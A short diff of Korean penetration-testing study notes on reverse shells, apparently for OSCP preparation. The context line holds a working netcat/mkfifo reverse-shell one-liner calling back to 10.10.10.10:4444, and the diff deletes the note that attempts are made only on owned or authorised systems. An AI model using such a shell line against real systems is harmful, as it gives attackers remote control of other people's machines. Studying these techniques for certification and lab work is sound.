@@ -59,4 +59,3 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/t
 - listener는 [reverse_shell.md](./reverse_shell.md)의 `LHOST`/`LPORT`와 같은 방식으로 둔다.
 - 각 언어의 문법이 조금씩 다르지만, 공통은 \"입출력을 소켓으로 연결\"이다.
 - OSCP에서는 여러 언어를 2~3개만 익혀 있으면 충분하다.
-- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
